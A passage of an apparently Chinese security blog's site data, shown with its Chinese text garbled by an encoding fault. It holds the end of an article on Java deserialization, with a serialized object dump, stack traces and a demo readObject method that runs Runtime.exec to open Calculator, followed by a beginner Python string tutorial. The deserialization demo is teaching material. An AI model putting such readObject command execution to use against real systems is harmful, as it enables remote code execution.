0x00 7e 00 00\n      classdescflags - 0x02 - sc_serializable\n      fieldcount - 3 - 0x00 03\n      fields\n        0:\n          int - i - 0x49\n          fieldname\n            length - 3 - 0x00 03\n            value - age - 0x616765\n        1:\n          object - l - 0x4c\n          fieldname\n            length - 4 - 0x00 04\n            value - name - 0x6e616d65\n          classname1\n            tc_string - 0x74\n              newhandle 0x00 7e 00 01\n              length - 18 - 0x00 12\n              value - ljava/lang/string; - 0x4c6a6176612f6c616e672f537472696e673b\n        2:\n          object - l - 0x4c\n          fieldname\n            length - 8 - 0x00 08\n            value - password - 0x70617373776f7264\n          classname1\n            tc_reference - 0x71\n              handle - 8257537 - 0x00 7e 00 01\n      classannotations\n        tc_endblockdata - 0x78\n      superclassdesc\n        tc_null - 0x70\n    newhandle 0x00 7e 00 02\n    classdata\n      com.pwddd.basic.student\n        values\n          age\n            (int)12 - 0x00 00 00 0c\n          name\n            (object)\n              tc_string - 0x74\n                newhandle 0x00 7e 00 03\n                length - 8 - 0x00 08\n                value - zhangsan - 0x7a68616e6773616e\n          password\n            (object)\n              tc_string - 0x74\n                newhandle 0x00 7e 00 04\n                length - 6 - 0x00 06\n                value - 123456 - 0x313233343536\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n\n\nå¯ä»¥çå°æä»¶çå¤´é¨æ¯aced0005ï¼è¿æ¯å¾å¤idsåè­¦çç¹å¾ä¹ä¸ã\n\n\n# ååºååè¿ç¨\n\nååºååæ¯å°åºååçæçæä»¶æèåºåè¿åä¸ºå¯¹è±¡çè¿ç¨ãå¦ä¸çä»£ç æ¯ååºååçè¿ç¨ï¼\n\nfileinputstream fis = new fileinputstream("./student.ser");\nobjectinputstream ois = new objectinputstream(fis);\nstudent student1 = (student) ois.readobject();\nsystem.out.println(student1); //student{name=\'zhangsan\', password=\'123456\', age=12}\n\n\n1\n2\n3\n4\n\n\n\n# ååºååæ¼æ´\n\néè¿è·è¸ªjavaååºååçä»£ç ï¼æä»¬åç°ï¼å½æä»¬å»åºåååååºååä¸ä¸ªå¯¹è±¡æ¶ï¼å¦ææä»¬çå¯¹è±¡å­å¨ä¸ä¸ªreadobjectåwriteobjectæ¹æ³ï¼é£ä¹å¨åºåååååºååæ¶ï¼å°±ä¼æ§è¡è¿ä¸ªæ¹æ³ãå¦ä¸æç¤ºï¼\n\nè°ç¨writeobjectï¼\n\nwriteobject:70, student (com.pwddd.basic)\ninvoke0:-1, nativemethodaccessorimpl (sun.reflect)\ninvoke:62, nativemethodaccessorimpl (sun.reflect)\ninvoke:43, delegatingmethodaccessorimpl (sun.reflect)\ninvoke:498, method (java.lang.reflect)\ninvokewriteobject:1155, objectstreamclass (java.io)\nwriteserialdata:1496, objectoutputstream (java.io)\nwriteordinaryobject:1432, objectoutputstream (java.io)\nwriteobject0:1178, objectoutputstream (java.io)\nwriteobject:348, objectoutputstream (java.io)\nmain:10, serialization (com.pwddd.basic)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nè°ç¨readobjectï¼\n\nreadobject:66, student (com.pwddd.basic)\ninvoke0:-1, nativemethodaccessorimpl (sun.reflect)\ninvoke:62, nativemethodaccessorimpl (sun.reflect)\ninvoke:43, delegatingmethodaccessorimpl (sun.reflect)\ninvoke:498, method (java.lang.reflect)\ninvokereadobject:1185, objectstreamclass (java.io)\nreadserialdata:2319, objectinputstream (java.io)\nreadordinaryobject:2210, objectinputstream (java.io)\nreadobject0:1690, objectinputstream (java.io)\nreadobject:508, objectinputstream (java.io)\nreadobject:466, objectinputstream (java.io)\nmain:13, serialization (com.pwddd.basic)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\né£ä¹ï¼å¦ææä»¬ååºååçå¯¹è±¡æreadobjectæ¹æ³ï¼å¹¶ä¸å¨è¯¥æ¹æ³ä¸­æä¸ä¸ªæ¶æçä»£ç ï¼å¨ååºååçæ¶åå°±ä¼æ§è¡è¿ä¸ä¸²æ¶æä»£ç ã\n\nprivate void readobject(objectinputstream objectinputstream) throws ioexception {\n  runtime.getruntime().exec("/system/applications/calculator.app/contents/macos/calculator");\n}\n\n\n1\n2\n3\n\n\nè½ç¶è¿ç§ä»£ç åºæ¬ä¸ä¼åºç°ï¼ä½æ¯æä»¬å¯ä»¥éè¿å±å±åµå¥ç­æ¹å¼ï¼è¾¾å°æä»¬çç®çã\n\n----------------------------------------\n\nååå°è¿ï¼æ»è§å¾æç¹æªå°½ãä½æ¯å·²ç»ä¸ç¥éåä»ä¹äºã',charsets:{cjk:!0},lastUpdated:"2022/05/25, 13:42:15",lastUpdatedTimestamp:1653486135e3},{title:"Pythonå­ç¬¦ä¸²çé£äºäº",frontmatter:{title:"Pythonå­ç¬¦ä¸²çé£äºäº",date:"2022-03-22T00:00:00.000Z",permalink:"/sec/dev/python/pystring",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Python"],tags:["Python"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2020.Python/00.Python%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.html",relativePath:"02.å®å¨/202.å®å¨å¼å/2020.Python/00.Pythonå­ç¬¦ä¸²çé£äºäº.md",key:"v-56606b1e",path:"/sec/dev/python/pystring/",headers:[{level:2,title:"åå»ºä¸ä¸ªå­ç¬¦ä¸²",slug:"åå»ºä¸ä¸ªå­ç¬¦ä¸²",normalizedTitle:"åå»ºä¸ä¸ªå­ç¬¦ä¸²",charIndex:92},{level:2,title:"æä½å­ç¬¦ä¸²çæ¹æ³ä»¬",slug:"æä½å­ç¬¦ä¸²çæ¹æ³ä»¬",normalizedTitle:"æä½å­ç¬¦ä¸²çæ¹æ³ä»¬",charIndex:1420},{level:3,title:"str() å°æ°å­è½¬åä¸ºå­ç¬¦ä¸²",slug:"str-å°æ°å­è½¬åä¸ºå­ç¬¦ä¸²",normalizedTitle:"str() å°æ°å­è½¬åä¸ºå­ç¬¦ä¸²",charIndex:1434},{level:3,title:"[] æåå­ç¬¦ä¸²åå­ç¬¦ä¸²åç",slug:"æåå­ç¬¦ä¸²åå­ç¬¦ä¸²åç",normalizedTitle:"[] æåå­ç¬¦ä¸²åå­ç¬¦ä¸²åç",charIndex:1775},{level:3,title:"å­ç¬¦ä¸²åå²ååå¹¶",slug:"å­ç¬¦ä¸²åå²ååå¹¶",normalizedTitle:"å­ç¬¦ä¸²åå²ååå¹¶",charIndex:2644},{level:3,title:"å­ç¬¦ä¸²æ¯è¾",slug:"å­ç¬¦ä¸²æ¯è¾",normalizedTitle:"å­ç¬¦ä¸²æ¯è¾",charIndex:2973},{level:3,title:"å­ç¬¦ä¸²æ¥æ¾",slug:"å­ç¬¦ä¸²æ¥æ¾",normalizedTitle:"å­ç¬¦ä¸²æ¥æ¾",charIndex:3364},{level:3,title:"å»é¤é¦å°¾ä¿¡æ¯",slug:"å»é¤é¦å°¾ä¿¡æ¯",normalizedTitle:"å»é¤é¦å°¾ä¿¡æ¯",charIndex:3902},{level:3,title:"å¤§å°åè½¬æ¢",slug:"å¤§å°åè½¬æ¢",normalizedTitle:"å¤§å°åè½¬æ¢",charIndex:4112},{level:3,title:"å­ç¬¦ä¸²æ ¼å¼",slug:"å­ç¬¦ä¸²æ ¼å¼",normalizedTitle:"å­ç¬¦ä¸²æ ¼å¼",charIndex:4555},{level:3,title:"å¯åå­ç¬¦ä¸²",slug:"å¯åå­ç¬¦ä¸²",normalizedTitle:"å¯åå­ç¬¦ä¸²",charIndex:5712}],excerpt:'<h1 id="pythonå­ç¬¦ä¸²çé£äºäº"><a class="header-anchor" href="#pythonå­ç¬¦ä¸²çé£äºäº">#</a> Pythonå­ç¬¦ä¸²çé£äºäº</h1>\n<blockquote>\n<p>æä¹è¯´å¢ãããPythonçè¯­æ³ç³ççæ¯å¤ªå¤äºï¼å­ç¬¦ä¸²æä½çåç§æ¹æ³ç®ç´æ¯ç§äºæä¸è¸ï¼è®°ä¹è®°ä¸ä½ãæ¾ä¸ªå°æ¹åä¸æ¥å§ï¼å¥½è®°æ§ä¸å¦çç¬å¤´åã</p>\n</blockquote>\n',headersStr:"åå»ºä¸ä¸ªå­ç¬¦ä¸² æä½å­ç¬¦ä¸²çæ¹æ³ä»¬ str() å°æ°å­è½¬åä¸ºå­ç¬¦ä¸² [] æåå­ç¬¦ä¸²åå­ç¬¦ä¸²åç å­ç¬¦ä¸²åå²ååå¹¶ å­ç¬¦ä¸²æ¯è¾ å­ç¬¦ä¸²æ¥æ¾ å»é¤é¦å°¾ä¿¡æ¯ å¤§å°åè½¬æ¢ å­ç¬¦ä¸²æ ¼å¼ å¯åå­ç¬¦ä¸²",content:'# Pythonå­ç¬¦ä¸²çé£äºäº\n\n> æä¹è¯´å¢ãããPythonçè¯­æ³ç³ççæ¯å¤ªå¤äºï¼å­ç¬¦ä¸²æä½çåç§æ¹æ³ç®ç´æ¯ç§äºæä¸è¸ï¼è®°ä¹è®°ä¸ä½ãæ¾ä¸ªå°æ¹åä¸æ¥å§ï¼å¥½è®°æ§ä¸å¦çç¬å¤´åã\n\n\n# åå»ºä¸ä¸ªå­ç¬¦ä¸²\n\nå­ç¬¦ä¸²åºè¯¥æ¯å¨å­¦ä¹ ä¸é¨ç¼ç¨è¯­è¨æ¶æåæ¥è§¦å°çä¸è¥¿ï¼âhelloworldâå°±æ¯ä¸ä¸ªå­ç¬¦ä¸²ãåä¸ªè¯­è¨ä¸­çå­ç¬¦ä¸²ææå·®å¼ï¼å¨Pythonä¸­ï¼å­ç¬¦ä¸²çæ¬è´¨å°±æ¯å­ç¬¦åºåãPythonä¸­ä¸æ¯æåä¸ªå­ç¬¦çç±»åï¼æ¯å¦å\'A\',å¨Pythonä¸­ä¹æ¯ä½ä¸ºä¸ä¸ªå­ç¬¦ä¸²ä½¿ç¨çã\n\nå¨Python3ä¸­ï¼å­ç¬¦ä¸²é»è®¤ä½¿ç¨16ä½çUnicodeç¼ç ï¼ä½¿ç¨ordåchrå½æ°ï¼å¯ä»¥å°å­ç¬¦ä¸²åç¼ç åè½¬æ¢ãã\n\nprint(chr(65))  # A\nprint(ord(\'A\')) # 65\n\n\n1\n2\n\n\næä»¬å¯ä»¥ä½¿ç¨ åå¼å·ãåå¼å·åå»ºå­ç¬¦ä¸²ãä½¿ç¨åå¼å·æåå¼å·åµå¥åå»ºçå­ç¬¦ä¸²ä¸­å¯ä»¥åå«å¦ä¸ç§å¼å·ï¼èµ·å°äºè½¬ä¹å¼å·çä½ç¨ãåæ¶ï¼ä½¿ç¨ä¸ä¸ªå¼å·å¼å§åå»ºå­ç¬¦ä¸²ï¼å¯ä»¥ä¿çå­ç¬¦ä¸²çæ ¼å¼ï¼è¿ç§æ¹å¼ä¹ç»å¸¸ä½ä¸ºå¤è¡æ³¨éä½¿ç¨ã\n\nstr = \'"hello",world\'\nprint(str)  # "hello",world\n\nstr = \'hello\\nworld\'\nprint(str)  # hello æ¢è¡ world\n\nstr = "hello\\nworld"\nprint(str) #"hello",world\n\nstr = """\n    public static void main(String[] args){\n        System.out.Println("hello world!");    \n    }\n"""\n\nprint(str)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå¦æè¦åå»ºä¸ä¸ªç©ºçå­ç¬¦ä¸²ï¼åªéè¦å¨å¼å·ä¸­ä¸å¡«åä»»ä½åå®¹å°±å¯ä»¥äºï¼è¿å¨è®¸å¤å¶ä»çç¼ç¨è¯­è¨ä¸­ä¹æ¯ä¸æ ·çãlen(str)ç¨äºè·åå­ç¬¦ä¸²çé¿åº¦ã\n\nstr = \'\'\nprint(len(str))  # 0\n\n\n1\n2\n\n\nå¦ææ³è¦å°å¤ä¸ªå­ç¬¦ä¸²æ¼æ¥èµ·æ¥ï¼å¯ä»¥ä½¿ç¨+æèç´æ¥å°ä¸¤ç»å¼å·æ¾å°ä¸èµ·ãå¦ææ³è¦å°å­ç¬¦ä¸²å¤å¶å¤ä»½ï¼å¯ä»¥ä½¿ç¨ç±»ä¼¼æ°å­¦æä½çä¹æ³ãå¨å¶ä»è¯­è¨ä¸­ï¼å¯è½éè¦åä¸ä¸ªå¾ªç¯æ¥å®ç°ã\n\na = \'hello\'\nb = \'world\'\n\nc = a+b\nd = \'hello\'\'world\'\n\nprint(c) # helloworld\nprint(d) # helloworld\n\nprint(a*3) # hellohellohello\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\næä»¬å¨ä½¿ç¨printæå°å­ç¬¦ä¸²æ¶ï¼é»è®¤æ¯æ¢è¡æå°çãprintå½æ°æä¸ä¸ªendåæ°ï¼ç¨æ¥å¶å®æ«å°¾æ·»å çåå®¹ï¼å¦ææå®äºè¿ä¸ªåæ°ï¼å°±ä¼ä»¥æ¹åæ°ç»å°¾ã\n\nprint("helloworld")\nprint("!!!!!") # helloworld æ¢è¡ !!!!!!\n\nprint("helloworld",end=\'\')\nprint("!!!!!") # helloworld!!!!!\n\n\n1\n2\n3\n4\n5\n\n\nå¯ä»¥ä½¿ç¨inputå½æ°è¯»å¥æ§å¶å°çè¾å¥ï¼inputå½æ°çåæ°ä¸­å¯ä»¥ä¼ éä¸ä¸ªå­ç¬¦ä¸²ï¼ç¨äºå¼å¯¼ç¨æ·è¾å¥ã\n\nuser_age = input("è¯·è¾å¥æ¨çå¹´é¾ï¼")\nprint(user_age)\n\n\n1\n2\n\n\n\n# æä½å­ç¬¦ä¸²çæ¹æ³ä»¬\n\n\n# str() å°æ°å­è½¬åä¸ºå­ç¬¦ä¸²\n\nprintå½æ°ä¼å°ä¸ä¸ªå­ç¬¦ä¸²è¾åºå°è¾åºè®¾å¤ä¸­ï¼ä¹å°±æ¯å¨æ§å¶å°æå°ãå¦æprintå½æ°çåæ°ä¸æ¯å­ç¬¦ä¸²ï¼æ¯å¶ä»å¯¹è±¡ï¼é£ä¹ç¼è¯å¨å°±ä¼èªå¨è°ç¨strå°é£å­ç¬¦ä¸²å¯¹è±¡è½¬åä¸ºå­ç¬¦ä¸²ãæä»¬ä¹å¯ä»¥èªå·±è°ç¨strå®ç°æ°å­è½¬åä¸ºå­ç¬¦ä¸²ã\n\nnum = 200\nnum_str = str(20.1)\nprint(num)\n\n\n1\n2\n3\n\n\næ³¨æï¼æè¿éåºç°äºä¸ä¸ªé®é¢ï¼ä¸é¢æä»¬å¨å®ä¹å­ç¬¦ä¸²çæ¶åä½¿ç¨è¿strä½ä¸ºåéãé£ä¹å¨è¿éä½¿ç¨strå½æ°è½¬æ¢æ°å­çæ¶åï¼å°±ä¼æ¥ä¸ä¸ªéï¼æç¤ºTypeError: \'str\' object is not callableãè¿ä¸ªå¨å¶ä»æä½è¯­è¨ä¸­åæ ·å­å¨çé®é¢ï¼æä»¬å¨ç¼åç¨åºæ¶ï¼ä¸è¦ä½¿ç¨ç³»ç»çä¿çå­ï¼å¹¶ä¸é¿ååå¸¸ç¨çå½æ°ååã\n\n\n# [] æåå­ç¬¦ä¸²åå­ç¬¦ä¸²åç\n\nå­ç¬¦ä¸²çæ¬è´¨æ¯å­ç¬¦åºåï¼æä»¬å¨å­ç¬¦ä¸²åæ·»å []ï¼æå®åç§»éå¯ä»¥è·åè¯¥ä½ç½®çå­ç¬¦ä¸²ãè¿ä¸ªåæ°ç»çæä½ç±»ä¼¼ãPythonä¸­çå­ç¬¦ä¸²ä¹æ¯æååºï¼å³ç´¢å¼ä¸ºè´æ°ã\n\nå­ç¬¦ä¸²åçæä½å¯ä»¥è®©æä»¬å¿«éè·åå­ç¬¦ä¸²çå­ä¸²ï¼è¯­æ³å¦ä¸ï¼\n\næä½                                              ç¤ºä¾                ç»æ\n[:] è·åæ´ä¸ªä¸²                                       "abcdef"[:]       "Abcdef"\n[start : ] ä»startå¼å§å°ç»å°¾                          "abcdef"[2:]      "cdef"\n[: end ]ä»å¤´å¼å§å°end - 1                            "Abcdef"[:2]      "ab"\n[start : end]ä»start å¼å§å° end - 1                 "abcdef"[2:4]     "cd"\n[start : end : step ]ä»startå¼å§å°end - 1 æ­¥é¿ä¸ºstep   "abcdef"[1:5:2]   "bd"\n\nå½startæendä¸ºè´æ°çæåµï¼\n\nç¤ºä¾                                     è¯´æ                    ç»æ\n"abcdefghijklmnopqrstuv wxyz"[-3:]     åæ°ä¸ä¸ª                  âxyzâ\n"abcdefghijklmnopqrstuv wxyz"[-8:-3]   åæ°ç¬¬å«ä¸ªå°åæ°ç¬¬ ä¸ä¸ª(åå¤´ä¸åå°¾)   \'stuvw\'\n"abcdefghijklmnopqrstuv wxyz"[::-1]    æ­¥é¿ä¸ºè´ï¼ ä»å³å°å·¦ ååæå       \'zyxwvutsrqpon mlkjihgfedcba\'\n\n\n# å­ç¬¦ä¸²åå²ååå¹¶\n\nsplitå½æ°å¯ä»¥æåå­ç¬¦ä¸²ï¼joinå¯ä»¥åå¹¶å­ç¬¦ä¸²ãsplité»è®¤ä½¿ç¨ç©ºæ ¼æåå­ç¬¦ä¸²ãä¹å¯ä»¥æå®æåçåæ°ãä½¿ç¨joinåå¹¶å­ç¬¦ä¸²æ¯ä½¿ç¨+æ¼æ¥å­ç¬¦ä¸²æ´é«æã\n\na = "hello world ! ! ! !"\nprint(a.split()) #[\'hello\', \'world\', \'!\', \'!\', \'!\', \'!\']\nprint(a.split("world")) #[\'hello \', \' ! ! ! !\']\n\na = [\'hello\',\'world\',\'zhangsan\',\'lisi\']\nprint("*".join(a)) # hello*world*zhangsan*lisi\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# å­ç¬¦ä¸²æ¯è¾\n\n== != å¤æ­æ¯å¦å«æç¸åçå­ç¬¦\n\nis not is å¤æ­æ¯å¦æ¯åä¸ä¸ªå¯¹è±¡\n\nin not in å¤æ­å­ä¸²å³ç³»\n\nprint( " hello" == " hello") #True\nprint("hello" != "world") # True\na = "hello" \nb = "world"\nprint(a is b) # False\nprint(a is not b) # True\nprint("hello" in "==helloworld") # True\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nå¨Pythonä¸­æä¸ä¸ªå­ç¬¦ä¸²é©»çæºå¶ï¼ä»ä¿çä¸ä»½ç¸åçä¸ä¸è¯éçå­ç¬¦ä¸²æ¹æ³ãå¯¹äºå­ç¬¦ä¸²ï¼ä»åå«ä¸åçº¿ãå­æ¯æ°å­ï¼ä¼å¯ç¨å­ç¬¦ä¸²é©»çæºå¶ã\n\na = "aaa_3"\nb = "aaa_3"\nprint(a is b) # True\n\n\n1\n2\n3\n\n\n\n# å­ç¬¦ä¸²æ¥æ¾\n\næ¹æ³                   è¯´æ             ç»æ\nlen(a)               å­ç¬¦ä¸²é¿åº¦          int\na.startwith("aaa")   ä»¥æå®ä½ç½®å¼å§        bool\na.endwith("aaa")     ä»¥æå®ä½ç½®ç»å°¾        bool\na.find(\'a\')          é¦æ¬¡åºç°å­ç¬¦ä¸²çä½ç½®     int\na.rfind(\'b\')         æåä¸æ¬¡åºç°å­ç¬¦ä¸²çä½ç½®   int\na.count(\'aaa\')       æå®å­ç¬¦ä¸²åºç°çæ¬¡æ°     int\na.isalnum()          å¨é¨æ¯æ°å­æå­æ¯       bool\na.isalpha()          æ¯å¦åªæå­æ¯         bool\na.isdigit()          æ¯å¦åªææ°å­         bool\na.isspace()          æ¯å¦ä¸ºç©ºç½          bool\na.isupper()          æ¯å¦ä¸ºå¤§å          bool\na.islower()          æ¯å¦ä¸ºå°å          bool\n\n\n# å»é¤é¦å°¾ä¿¡æ¯\n\næä»¬å¯ä»¥éè¿stripå»é¤é¦å°¾æå®çåå®¹ï¼lstripå»é¤é¦é¨åå®¹ï¼rstripå»é¤å°¾é¨æå®çåå®¹ã\n\na = "   helloworld   "\nprint(a.strip(" ")) #helloworld\n\na = "* helloworld -"\nprint(a.lstrip("*").rstrip("-").strip(" ")) #helloworld\n\n\n1\n2\n3\n4\n5\n\n\n\n# å¤§å°åè½¬æ¢\n\nç¤ºä¾               è¯´æ                  ç»æ\na.capitalize()   äº§çæ°çå­ç¬¦ä¸²ï¼é¦å­æ¯å¤§å       \na.title()        äº§çæ°çå­ç¬¦ä¸²ï¼æ¯ä¸ªåè¯é¦å­æ¯å¤§å   \na.upper()        äº§çæ°çå­ç¬¦ä¸²ï¼ææå­ç¬¦å¤§å      \na.lower()        äº§çæ°çå­ç¬¦ä¸²ï¼ææåè¯å°å      \na.swapcase()     äº§çæ°çå­ç¬¦ä¸²ï¼ææå­ç¬¦å¤§å°åè½¬æ¢   \n\na = "hello, WORLD"\nprint(a.capitalize()) #Hello, world\nprint(a.title()) # Hello, World\nprint(a.upper()) # HELLO, WORLD\nprint(a.lower()) # hello, world\nprint(a.swapcase()) # HELLO, world\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# å­ç¬¦ä¸²æ ¼å¼\n\nå¯ä»¥ä½¿ç¨center\\ljust\\rjustè°æ´å­ç¬¦ä¸²çè¾åºæçã\n\na = "abc"\nprint(a.center(10, "-")) # ---abc----\nprint(a.ljust(10, "-")) # abc-------\nprint(a.rjust(10, "-")) # -------abc\n\n\n1\n2\n3\n4\n\n\nPython2.6å¼å§ï¼å¯ä»¥ä½¿ç¨str.formatæ¹å¼è¿è¡å­ç¬¦ä¸²æ ¼å¼åã\n\na = "å§åï¼{0},å¹´é¾ï¼{1}".format("zhangsan",22)\nprint(a) # å§åï¼zhangsan,å¹´é¾ï¼22\n\na = "å§åï¼{name},å¹´é¾ï¼{age}".format(name="zhangsan",age=22)\nprint(a) # å§åï¼zhangsan,å¹´é¾ï¼22\n\n\n1\n2\n3\n4\n5\n\n\nformatåæ¶æ¯æä¸äºç¹æ®çæ ¼å¼åã\n\nprint("{:*>8}".format("a")) # *******a\n\n# : æå®å¡«åçåå®¹ ï¼ > < ^ åå«ä»£è¡¨å³å¯¹é½ï¼å·¦å¯¹é½ï¼å±ä¸­ æ°å­ä»£è¡¨å®½åº¦\n\n\n1\n2\n3\n\n\næ°å­çæ ¼å¼åæ¹å¼åCè¯­è¨ä¸­ç±»ä¼¼ï¼javaä¸­ä½¿ç¨Printfä¹åæ ·æ¯æç±»ä¼¼çæ ¼å¼åæ¹å¼ï¼\n\næ°å­           æ ¼å¼        è¾åº          æè¿°\n3.1415926    {:.2f}    3.14        ä¿çå°æ°ç¹åä¸¤ä½\n3.1415926    {:+.2f}   3.14        å¸¦ç¬¦å·ä¿çå°æ°ç¹åä¸¤ä½\n2.71828      {:.0f}    3           ä¸å¸¦å°æ°\n5            {:0>2d}   05          æ°å­è¡¥é¶ (å¡«åå·¦è¾¹, å®½åº¦ä¸º 2)\n5            {:x<4d}   5xxx        æ°å­è¡¥ x (å¡«åå³è¾¹, å®½åº¦ä¸º 4)\n10           {:x<4d}   10xx        æ°å­è¡¥ x (å¡«åå³è¾¹, å®½åº¦ä¸º 4)\n1000000      {:,}      1,000,000   ä»¥éå·åéçæ°å­æ ¼å¼\n0.25         {:.2%}    25.00%      ç¾åæ¯æ ¼å¼\n1000000000   {:.2e}    1.00E+09    ææ°è®°æ³\n13           {:10d}    13          å³å¯¹é½ (é»è®¤, å®½åº¦ä¸º 10)\n13           {:<10d}   13          å·¦å¯¹é½ (å®½åº¦ä¸º 10)\n13           {:^10d}   13          ä¸­é´å¯¹é½ (å®½åº¦ä¸º 10)\n\n\n# å¯åå­ç¬¦ä¸²\n\npythonä¸­çå­ç¬¦ä¸²ä¸æ¯æä¿®æ¹ï¼éè¦ä¿®æ¹çè¯éè¦éæ°åå»ºä¸ä¸ªå­ç¬¦ä¸²ãå¯ä»¥ä½¿ç¨iohæèarrayæ¨¡åï¼å¨æä¿®æ¹ã\n\nimport io\ns = "hello.txt"\nsio = io.StringIO(s)\n\nprint(sio) # <_io.StringIO object at 0x7fdc180abd90>\n\nprint(sio.getvalue()) # hello.txt\n\nsio.seek(7)\nsio.write("g")\nprint(sio.getvalue()) # hello.tgt\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n----------------------------------------\n\nå°±å°è¿éå§ï¼åé¢å­¦äºå¶ä»éªæä½ä¼ç»§ç»­è¡¥åå°è¿éçã',normalizedContent:'# pythonå­ç¬¦ä¸²çé£äºäº\n\n> æä¹è¯´å¢ãããpythonçè¯­æ³ç³ççæ¯å¤ªå¤äºï¼å­ç¬¦ä¸²æä½çåç§æ¹æ³ç®ç´æ¯ç§äºæä¸è¸ï¼è®°ä¹è®°ä¸ä½ãæ¾ä¸ªå°æ¹åä¸æ¥å§ï¼å¥½è®°æ§ä¸å¦çç¬å¤´åã\n\n\n# åå»ºä¸ä¸ªå­ç¬¦ä¸²\n\nå­ç¬¦ä¸²åºè¯¥æ¯å¨å­¦ä¹ ä¸é¨ç¼ç¨è¯­è¨æ¶æåæ¥è§¦å°çä¸è¥¿ï¼âhelloworldâå°±æ¯ä¸ä¸ªå­ç¬¦ä¸²ãåä¸ªè¯­è¨ä¸­çå­ç¬¦ä¸²ææå·®å¼ï¼å¨pythonä¸­ï¼å­ç¬¦ä¸²çæ¬è´¨å°±æ¯å­ç¬¦åºåãpythonä¸­ä¸æ¯æåä¸ªå­ç¬¦çç±»åï¼æ¯å¦å\'a\',å¨pythonä¸­ä¹æ¯ä½ä¸ºä¸ä¸ªå­ç¬¦ä¸²ä½¿ç¨çã\n\nå¨python3ä¸­ï¼å­ç¬¦ä¸²é»è®¤ä½¿ç¨16ä½çunicodeç¼ç ï¼ä½¿ç¨ordåchrå½æ°ï¼å¯ä»¥å°å­ç¬¦ä¸²åç¼ç åè½¬æ¢ãã\n\nprint(chr(65))  # a\nprint(ord(\'a\')) # 65\n\n\n1\n2\n\n\næä»¬å¯ä»¥ä½¿ç¨ åå¼å·ãåå¼å·åå»ºå­ç¬¦ä¸²ãä½¿ç¨åå¼å·æåå¼å·åµå¥åå»ºçå­ç¬¦ä¸²ä¸­å¯ä»¥åå«å¦ä¸ç§å¼å·ï¼èµ·å°äºè½¬ä¹å¼å·çä½ç¨ãåæ¶ï¼ä½¿ç¨ä¸ä¸ªå¼å·å¼å§åå»ºå­ç¬¦ä¸²ï¼å¯ä»¥ä¿çå­ç¬¦ä¸²çæ ¼å¼ï¼è¿ç§æ¹å¼ä¹ç»å¸¸ä½ä¸ºå¤è¡æ³¨éä½¿ç¨ã\n\nstr = \'"hello",world\'\nprint(str)  # "hello",world\n\nstr = \'hello\\nworld\'\nprint(str)  # hello æ¢è¡ world\n\nstr = "hello\\nworld"\nprint(str) #"hello",world\n\nstr = """\n    public static void main(string[] args){\n        system.out.println("hello world!");    \n    }\n"""\n\nprint(str)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå¦æè¦åå»ºä¸ä¸ªç©ºçå­ç¬¦ä¸²ï¼åªéè¦å¨å¼å·ä¸­ä¸å¡«åä»»ä½åå®¹å°±å¯ä»¥äºï¼è¿å¨è®¸å¤å¶ä»çç¼ç¨è¯­è¨ä¸­ä¹æ¯ä¸æ ·çãlen(str)ç¨äºè·åå­ç¬¦ä¸²çé¿åº¦ã\n\nstr = \'\'\nprint(len(str))  # 0\n\n\n1\n2\n\n\nå¦ææ³è¦å°å¤ä¸ªå­ç¬¦ä¸²æ¼æ¥èµ·æ¥ï¼å¯ä»¥ä½¿ç¨+æèç´æ¥å°ä¸¤ç»å¼å·æ¾å°ä¸èµ·ãå¦ææ³è¦å°å­ç¬¦ä¸²å¤å¶å¤ä»½ï¼å¯ä»¥ä½¿ç¨ç±»ä¼¼æ°å­¦æä½çä¹æ³ãå¨å¶ä»è¯­è¨ä¸­ï¼å¯è½éè¦åä¸ä¸ªå¾ªç¯æ¥å®ç°ã\n\na = \'hello\'\nb = \'world\'\n\nc = a+b\nd = \'hello\'\'world\'\n\nprint(c) # helloworld\nprint(d) # helloworld\n\nprint(a*3) # hellohellohello\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\næä»¬å¨ä½¿ç¨printæå°å­ç¬¦ä¸²æ¶ï¼é»è®¤æ¯æ¢è¡æå°çãprintå½æ°æä¸ä¸ªendåæ°ï¼ç¨æ¥å¶å®æ«å°¾æ·»å çåå®¹ï¼å¦ææå®äºè¿ä¸ªåæ°ï¼å°±ä¼ä»¥æ¹åæ°ç»å°¾ã\n\nprint("helloworld")\nprint("!!!!!") # helloworld æ¢è¡ !!!!!!\n\nprint("helloworld",end=\'\')\nprint("!!!!!") # helloworld!!!!!\n\n\n1\n2\n3\n4\n5\n\n\nå¯ä»¥ä½¿ç¨inputå½æ°è¯»å¥æ§å¶å°çè¾å¥ï¼inputå½æ°çåæ°ä¸­å¯ä»¥ä¼ éä¸ä¸ªå­ç¬¦ä¸²ï¼ç¨äºå¼å¯¼ç¨æ·è¾å¥ã\n\nuser_age = input("è¯·è¾å¥æ¨çå¹´é¾ï¼")\nprint(user_age)\n\n\n1\n2\n\n\n\n# æä½å­ç¬¦ä¸²çæ¹æ³ä»¬\n\n\n# str() å°æ°å­è½¬åä¸ºå­ç¬¦ä¸²\n\nprintå½æ°ä¼å°ä¸ä¸ªå­ç¬¦ä¸²è¾åºå°è¾åºè®¾å¤ä¸­ï¼ä¹å°±æ¯å¨æ§å¶å°æå°ãå¦æprintå½æ°çåæ°ä¸æ¯å­ç¬¦ä¸²ï¼æ¯å